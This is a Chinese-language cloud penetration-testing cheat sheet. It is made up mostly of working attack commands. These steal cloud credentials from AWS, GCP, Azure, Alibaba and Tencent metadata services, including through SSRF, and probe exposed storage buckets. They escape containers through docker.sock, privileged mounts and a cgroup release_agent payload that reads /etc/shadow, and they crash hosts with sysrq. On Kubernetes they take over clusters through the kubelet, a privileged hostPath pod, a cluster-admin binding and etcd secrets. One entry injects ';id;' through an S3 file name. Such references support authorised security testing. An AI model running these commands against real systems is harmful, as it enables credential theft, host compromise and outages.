# 云安全测试实战参考

> 覆盖: 云元数据服务 → 对象存储 → 容器逃逸 → K8s渗透 → IAM配置错误 → Serverless安全
> 定位: 与 SecSkills-main 互补，SecSkills 不覆盖云原生环境

---

## 1. 云元数据服务利用 (Cloud Metadata)

### 1.1 AWS 元数据

```bash
# 标准 IMDSv1 端点 (169.254.169.254)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/user-data/    # ★ 用户数据，常含密钥
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# IMDSv2 — 需要 PUT token
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# 更多信息
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/ami-id
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

### 1.2 GCP 元数据

```bash
# GCP 元数据端点
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/<SA>/token

# 递归列出
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true
```

### 1.3 Azure 元数据

```bash
# Azure IMDS
curl -H "Metadata: true" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
curl -H "Metadata: true" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'

# 获取管理 Token
curl -H "Metadata: true" \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<CLIENT_ID>'
```

### 1.4 阿里云 元数据

```bash
# 阿里云 ECS 元数据
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/user-data/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### 1.5 腾讯云 元数据

```bash
# 腾讯云 CVM 元数据
curl http://metadata.tencentyun.com/latest/meta-data/
curl http://metadata.tencentyun.com/latest/meta-data/cvm/cam/
```

### 1.6 SSRF → 元数据利用链

```bash
# 通过 SSRF 获取云凭证
# 1. 发现 SSRF 漏洞 (目标内网服务发请求)
# 2. 请求元数据端点:
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# 3. 用获取的 Token 访问云 API
aws configure set aws_access_key_id <KEY>
aws configure set aws_secret_access_key <SECRET>
aws configure set aws_session_token <TOKEN>
aws s3 ls  # 列出所有 S3 桶
aws ec2 describe-instances --region us-east-1
```

---

## 2. 对象存储公开访问

### 2.1 AWS S3 公开检测

```bash
# 检测 Bucket 是否公开
# URL 格式: https://<bucket>.s3.amazonaws.com
#           https://s3.amazonaws.com/<bucket>
#           https://<bucket>.s3.<region>.amazonaws.com

# 使用 AWS CLI
aws s3 ls s3://<bucket> --no-sign-request
aws s3 ls s3://<bucket> --recursive --no-sign-request

# 或 curl
curl -s https://<bucket>.s3.amazonaws.com/
curl -s https://<bucket>.s3.amazonaws.com/?prefix=backup/
curl -s https://<bucket>.s3.amazonaws.com/?prefix=secret/config/

# 批量检查
for bucket in $(cat buckets.txt); do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com/")
  echo "$bucket → $status"
done
```

### 2.2 AWS S3 策略绕过

```bash
# 如果返回 AccessDenied，尝试:
# 1. 指定 Region
curl -s https://<bucket>.s3.us-east-1.amazonaws.com/

# 2. 路径模式
curl -s https://s3.amazonaws.com/<bucket>/secret.txt

# 3. 旧版路径
curl -s https://<bucket>.s3-external-1.amazonaws.com/

# 4. 带 Content-Type 绕过 ACL
curl -s -H "Content-Type: " https://<bucket>.s3.amazonaws.com/secret.txt

# 5. 签名 URL 发现 (从 JS/HTML 提取)
```

### 2.3 阿里云 OSS

```bash
# OSS Bucket: https://<bucket>.oss-<region>.aliyuncs.com
curl -s https://<bucket>.oss-cn-hangzhou.aliyuncs.com/

# 列出文件
curl -s "https://<bucket>.oss-cn-hangzhou.aliyuncs.com/?prefix=conf/"
```

### 2.4 Azure Blob 存储

```bash
# Azure Blob: https://<account>.blob.core.windows.net/<container>
curl -s https://<account>.blob.core.windows.net/<container>?restype=container&comp=list

# 公共容器匿名访问
curl -s https://<account>.blob.core.windows.net/backup?restype=container&comp=list
```

### 2.5 GCP Cloud Storage

```bash
# GCS: https://storage.googleapis.com/<bucket>
#      https://<bucket>.storage.googleapis.com
curl -s https://storage.googleapis.com/<bucket>/

# 列出对象
curl -s "https://storage.googleapis.com/storage/v1/b/<bucket>/o"
```

---

## 3. Docker 容器逃逸

### 3.1 Docker Socket 暴露

```bash
# 检测: 容器内是否有 /var/run/docker.sock
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# 利用: 通过 docker.sock 操作宿主机 Docker
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/hostos -it busybox chroot /hostos bash

# 或通过 curl
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"busybox","Cmd":["chroot","/host","bash"],"Binds":["/:/host:rw"]}' \
  http://localhost/containers/create

# 挂载宿主机的 Docker Socket 到容器
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
```

### 3.2 Privileged 容器

```bash
# 检测: 是否特权容器
cat /proc/1/cgroup | grep docker
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = 特权

# 利用: 挂载宿主机磁盘
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
# 现在有宿主机 root shell

# 使用 nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### 3.3 SYS_ADMIN Capability

```bash
# 检测
cat /proc/self/status | grep CapEff
# 如果包含 cap_sys_admin → 可挂载 cgroup

# 利用 cgroup notify_on_release 逃逸
# 1. 创建 cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. 设置 release_agent
echo "/tmp/payload.sh" > /tmp/cgrp/release_agent

# 3. 写入 payload
echo '#!/bin/sh
cat /etc/shadow > /tmp/output' > /tmp/payload.sh
chmod +x /tmp/payload.sh

# 4. 触发
echo 1 > /tmp/cgrp/x/notify_on_release
echo $$ > /tmp/cgrp/x/cgroup.procs
sleep 1
cat /tmp/output
```

### 3.4 宿主机 PID Namespace

```bash
# 检测: 容器是否共享宿主机 PID
ps aux | head -20

# 利用: 通过宿主机进程注入
# 查找 SSH 进程 PID
nsenter -t <SSH_PID> -m bash
# 或注入到已有进程
```

### 3.5 /proc/sysrq-trigger

```bash
# 如果容器有 CAP_SYS_ADMIN + 宿主机未禁用 Magic SysRq
# 直接触发 reboot/panic
echo b > /proc/sysrq-trigger  # 重启
echo c > /proc/sysrq-trigger  # crash
```

---

## 4. Kubernetes 渗透

### 4.1 API Server 未授权

```bash
# 检测: K8s API Server 未授权访问
# 默认端口 6443 (HTTPS) 或 8080 (HTTP, 旧版)
curl -k https://<target>:6443/api/v1/namespaces
curl http://<target>:8080/api/v1/pods

# 检查是否可匿名访问
curl -k https://<target>:6443/api -H "Authorization: Bearer "

# 检测: 匿名角色绑定
curl -k https://<target>:6443/api/v1/secrets
curl -k https://<target>:6443/api/v1/configmaps
```

### 4.2 Kubelet API 未授权

```bash
# Kubelet 默认 10250 (认证) 或 10255 (只读，旧版)
# 10250: 可执行命令
curl -k https://<target>:10250/pods
curl -k https://<target>:10250/run/<namespace>/<pod>/<container> -d "cmd=id"

# 10255: 只读
curl http://<target>:10255/pods
curl http://<target>:10255/spec/

# 列举节点上的 Pod
curl -k https://<target>:10250/runningpods/
```

### 4.3 Pod Service Account 利用

```bash
# 在 Pod 内部，Service Account Token 在
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 使用 Token 访问 API Server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# 检查权限
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/pods

# 创建特权 Pod 逃逸
cat <<EOF | curl -k -H "Authorization: Bearer $TOKEN" -X POST $APISERVER/api/v1/namespaces/default/pods -d @-
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "escape-pod"},
  "spec": {
    "containers": [{
      "name": "escape",
      "image": "busybox",
      "command": ["chroot","/host","bash"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"mountPath": "/host","name": "host-root"}]
    }],
    "volumes": [{"name": "host-root","hostPath": {"path": "/"}}],
    "automountServiceAccountToken": false
  }
}
EOF
```

### 4.4 RBAC 权限提升

```bash
# 创建 RoleBinding 提升权限
# 如果当前 SA 有 create bindings 权限

# 1. 创建绑定将 cluster-admin 绑定到当前用户
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwn-binding
subjects:
- kind: ServiceAccount
  name: <CURRENT_SA>
  namespace: <NAMESPACE>
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
```

### 4.5 Etcd 访问

```bash
# Etcd 默认 2379，存有集群所有 Secrets
curl http://<target>:2379/v2/keys/
curl http://<target>:2379/v2/keys/registry/secrets/
curl http://<target>:2379/v2/keys/registry/secrets/default/

# API Server 的 Token 文件也在 etcd 中
```

---

## 5. IAM 配置错误检测

### 5.1 AWS IAM 检查

```bash
# 检查当前凭证权限
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies
aws iam list-groups-for-user

# 检查 S3 权限
aws s3 ls
aws s3api get-bucket-acl --bucket <BUCKET>
aws s3api get-bucket-policy --bucket <BUCKET>

# 检查 EC2 权限
aws ec2 describe-instances --region all
aws ec2 describe-security-groups --region all

# 检查 IAM 提升路径
# 1. 如果 iam:PassRole → 可启动带高权限角色的 EC2
# 2. 如果 iam:CreateAccessKey → 可为任意用户创建 Key
# 3. 如果 iam:UpdateAssumeRolePolicy → 修改信任策略
```

### 5.2 过度信任角色检测

```bash
# 检查谁可以 AssumeRole
aws iam get-role --role-name <ROLE>
# 检查 AssumeRolePolicyDocument 中是否存在通配符
# "Principal": "*" 或 "AWS": "*" = 任何人可扮演该角色
```

---

## 6. Serverless 安全测试

### 6.1 函数 URL 未授权

```bash
# AWS Lambda 函数 URL
curl https://<random>.lambda-url.<region>.on.aws/

# GCP Cloud Functions
curl https://<region>-<project>.cloudfunctions.net/<function>

# Azure Functions
curl https://<app>.azurewebsites.net/api/<function>
```

### 6.2 事件数据注入

```bash
# Lambda 函数通常处理来自 S3/DynamoDB/SQS 的事件
# 如果函数将事件数据拼接到命令中 → 命令注入

# 给 S3 对象名注 payload
# 创建文件名为 ";id;" 的对象 → 触发 Lambda → 执行 id
```

---

## 速查表

| 云厂商 | 元数据端点 | 关键信息 |
|--------|-----------|---------|
| AWS | `169.254.169.254/latest/` | IAM 凭证 / user-data |
| GCP | `metadata.google.internal` | Service Account Token |
| Azure | `169.254.169.254/metadata/` | Managed Identity Token |
| 阿里云 | `100.100.100.200/latest/` | RAM 凭证 / user-data |
| 腾讯云 | `metadata.tencentyun.com` | CAM 凭证 |

| 逃逸路径 | 检测条件 | 利用命令 |
|---------|---------|---------|
| Docker Socket | `/var/run/docker.sock` 存在 | `docker run -v /:/host ...` |
| Privileged | `CapEff=0000003fffffffff` | `mount /dev/sda1 /mnt/host` |
| SYS_ADMIN | `CapEff` 含 cap_sys_admin | cgroup release_agent |
| K8s SA Token | `/var/run/secrets/.../token` 可读 | curl K8s API |

---

*参考: docs.aws.amazon.com, cloud.google.com, docs.microsoft.com, kubernetes.io/docs*
